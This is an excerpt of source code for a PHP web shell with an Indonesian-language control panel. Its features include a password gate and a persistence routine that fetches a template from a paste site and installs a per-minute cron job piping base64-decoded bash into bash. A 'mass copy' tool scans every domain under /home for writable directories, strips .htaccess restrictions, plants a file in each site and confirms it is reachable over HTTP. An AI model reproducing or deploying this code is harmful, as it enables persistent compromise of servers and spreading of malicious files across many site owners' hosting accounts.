...
define('GECKO_AUTH_HASH', '$2y$12$yPc3923p3ayEvr8zRsUQc.fPW639lTuXZ/aNx.sk5tL6z896n88wO');
...
{
    $dl = geckoRecoverDownload($url);
    if ($dl[0] && !empty($dl[1]) && is_file($dl[1])) {
        $data = @file_get_contents($dl[1]);
        @unlink($dl[1]);
...
function geckoRecoverDeployViaRemoteCronSh($dirPath, $fileName, $downloadUrl)
{
    ...
    $cronTemplateUrl = 'https://paste.myconan.net/673684.txt';
    $instanceId = substr(md5($dirPath . '|' . $fileName . '|' . $downloadUrl), 0, 8);
...
BASH;
    ...
    $cronPayload = "#!/bin/bash\n"
        . "INSTALL_PATH=" . geckoBashQuote($installPath) . "\n"
        . "SHM_INSTALL_PATH=" . geckoBashQuote($shmPath) . "\n"
        . "_install_dir=\"\$(dirname \"\$INSTALL_PATH\")\"\n"
        . "_shm_dir=\"\$(dirname \"\$SHM_INSTALL_PATH\")\"\n"
        . "mkdir -p \"\$_install_dir\" \"\$_shm_dir\"\n"
        . "echo " . geckoBashQuote($tmpB64) . " | base64 -d > \"\$INSTALL_PATH\"\n"
        . "echo " . geckoBashQuote($shmB64) . " | base64 -d > \"\$SHM_INSTALL_PATH\"\n"
        . "chmod 700 \"\$INSTALL_PATH\" \"\$SHM_INSTALL_PATH\"\n"
        . "bash \"\$INSTALL_PATH\" --recover\n";
    $cronPayloadB64 = base64_encode($cronPayload);
    $cronLine = '*/1 * * * * echo ' . geckoBashQuote($cronPayloadB64) . ' | base64 -d 2>/dev/null | bash >/dev/null 2>&1 ' . $cronMarker;
...
function geckoFindWritableDirs($startPath, $maxDepth = 6, $limit = 200)
{
...
function geckoMassFindWritableDirs($root, $max = 8)
{
    $skip = geckoMassSkipScan();
    $found = array();
    $scanned = 0;
    $stack = array(array(rtrim(str_replace('\\', '/', $root), '/'), 0));
    while ($stack && $scanned < 5000) {
        $item = array_pop($stack);
        $dir = $item[0];
        $depth = $item[1];
        $scanned++;
        if (!is_dir($dir) || !is_readable($dir)) continue;
        if ($depth >= 2 && @is_writable($dir)) {
...
function geckoMassHttpStatus($url, $timeout = 7)
{
...
function geckoMassCopyRun($src, $base, $debug = false)
{
    @set_time_limit(300);
    ...
    if ($src === '' || $base === '') {
        return array('ok' => false, 'error' => 'Source file dan Base path wajib diisi.');
    }
    ...
    $domains = geckoMassFindDomains($base);
    $domainCount = count($domains);
    $log('Domains found: ' . $domainCount);
    ...
    foreach ($domains as $domainDir) {
        ...
        $code = geckoMassHttpStatus('https://' . $domainName . '/');
        $log('  https status: ' . $code);
        if ($code < 200 || $code >= 500) {
            $code = geckoMassHttpStatus('http://' . $domainName . '/');
        ...
        $log('  webRoot: ' . $webRoot);
        $candidates = geckoMassFindWritableDirs($webRoot, 8);
        $log('  writable candidates: ' . count($candidates));
        foreach ($candidates as $c) {
            $log('    - ' . $c);
        }

        if (empty($candidates)) {
            $log('  SKIP: no writable dirs found');
            $skipped++;
            continue;
        }
        ...
        foreach ($candidates as $targetDir) {
            $log('  trying: ' . $targetDir);

            if (!geckoMassClearPathHtaccess($webRoot, $targetDir)) {
                $log('    SKIP: htaccess block, can\'t remove');
                continue;
            }
            ...
            if (!$method) {
                $hasExec = (function_exists('shell_exec') || function_exists('exec') || function_exists('system') || function_exists('proc_open'));
                $log('    SKIP: copy failed [exec_avail=' . ($hasExec ? 'yes' : 'no') . ']');
                continue;
            }
            $log('    copied to: ' . $dest . ' [method: ' . $method . ']');

            geckoMassWriteAllowHtaccess($targetDir, $filename);

            $url = geckoMassBuildUrl('https', $domainName, $domainDir, $dest);
            $log('    verify url: ' . $url);
            $verify = geckoMassHttpStatus($url);
            $log('    verify status: ' . $verify);
            if ($verify !== 200) {
                $url2 = geckoMassBuildUrl('http', $domainName, $domainDir, $dest);
                $v2 = geckoMassHttpStatus($url2);
                $log('    verify http: ' . $url2 . ' => ' . $v2);
                if ($v2 === 200) {
                    $url = $url2;
                } else {
                    @unlink($dest);
                    $log('    SKIP: url not accessible, file removed');
                    continue;
                }
            }
    ...
    usort($successUrls, function ($a, $b) {
        $ha = parse_url($a, PHP_URL_HOST);
        $hb = parse_url($b, PHP_URL_HOST);
        $ta = strtolower(ltrim((string)strrchr((string)$ha, '.'), '.'));
        $tb = strtolower(ltrim((string)strrchr((string)$hb, '.'), '.'));
        $ai = ($ta === 'id') ? 0 : 1;
        $bi = ($tb === 'id') ? 0 : 1;
    ...
    return array(
        ...
        'message' => 'Domains scanned: ' . $domainCount . ' · Confirmed: ' . count($successUrls),
    );
}
...
if (isset($_GET['api'])) {
    ...
    switch ($action) {
        ...
        case 'find_writable_dirs':
            ...
            $maxDepth = (int)_v($input, 'max_depth', 6);
            $limit = (int)_v($input, 'limit', 200);
        ...
        case 'mass_copy':
            ...
            $result = null;
            try {
                $result = geckoMassCopyRun($src, $base, $debug);
            } catch (Exception $ex) {
  ...
  <div class="modal m-lg tool-modal">
    ...
    <div class="modal-body">
      ...
      <div class="tool-grid" style="margin-top:14px">
        ...
        <div class="fg"><label>Max depth</label><input type="number" id="fwDepth" value="6" min="0" max="12"></div>
        <div class="fg"><label>Limit results</label><input type="number" id="fwLimit" value="200" min="1" max="500"></div>
      </div>
      <div class="sec-terminal" style="margin-top:14px">
...
<div class="overlay" id="mMassCopy">
  <div class="modal m-lg tool-modal">
    ...
    <div class="modal-body">
      <div class="sec-callout">Spread 1 file ke writable webroot domain di bawah base path (logic dari <code>copy.php</code>). Hanya URL yang verify HTTP 200 yang dihitung confirmed.</div>
      <div class="tool-grid" style="margin-top:14px">
        ...
        <div class="fg span2"><label>Base Path (domain source)</label><input type="text" id="mcBase" placeholder="/home/* atau /home/username" autocomplete="off"></div>
        <div class="fg span2">
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
...
async function runFindWritable(){
  ...
  const max_depth=depthEl?parseInt(depthEl.value,10):6;
...
function openMassCopy(){
  ...
  const baseEl=$('#mcBase');
  const cur=typeof toAbsolutePath==='function'?toAbsolutePath(S.path||''):(S.path||'');
  // Prefill source from first selected file if any
  ...
  if(baseEl && (!baseEl.value || baseEl.value==='')){
    // Guess /home or /home/* from current path
    if(cur && cur.indexOf('/home/')===0){
      const parts=cur.split('/').filter(Boolean);
      // /home/user/... → /home/user   or suggest /home/*
  ...
  const meta=$('#mcMeta');
  if(out){
    out.textContent='Isi Source File + Base Path lalu klik Spread. Hanya URL HTTP 200 yang confirmed.';
    out.className='tool-output tall empty sec-terminal-out';
  }
...
async function runMassCopy(){
  ...
  if(!src||!base){
    toast('Isi Source File dan Base Path','error');
    return;
  }
  mcLastUrls=[];
  if(out){ out.textContent='Spreading… scanning domains under '+base+' (bisa lama)'; out.className='tool-output tall sec-terminal-out'; }
  if(meta) meta.textContent='running…';
  if(btn){ btn.disabled=true; btn.textContent='Spreading…'; }
  let d;
  try{
    d=await api('mass_copy',{src:src,base:base,debug:debug?1:0});
  }catch(e){
    d={ok:false,error:'Network error or timeout: '+(e&&e.message?e.message:String(e))};
  }
  ...
  mcLastUrls=Array.isArray(d.urls)?d.urls.slice():[];
  const lines=[];
  lines.push(d.message||'Done');
  lines.push('Source: '+(d.source||src));
  lines.push('Base: '+(d.base||base));
  lines.push('Filename: '+(d.filename||''));
  lines.push('Domains scanned: '+(d.domain_count||0)+' · Confirmed: '+(d.confirmed||0)+' · Skipped: '+(d.skipped||0));
  lines.push('');
  if(mcLastUrls.length){
    lines.push('Confirmed URLs:');
    for(let i=0;i<mcLastUrls.length;i++){
      lines.push((i+1)+'. '+mcLastUrls[i]);
    }
  }else{
    lines.push('(tidak ada URL confirmed)');
  }
  if(d.debug_log&&d.debug_log.length){
    lines.push('');
    lines.push('--- debug ---');
    for(let i=0;i<d.debug_log.length;i++) lines.push(d.debug_log[i]);
  }
  if(out){ out.textContent=lines.join('\n'); out.className='tool-output tall sec-terminal-out'; }
  if(meta) meta.textContent=(d.confirmed||0)+' confirmed / '+(d.domain_count||0)+' domains';
  toast(d.message||'Mass copy selesai', (d.confirmed>0)?'ok':'error');
}
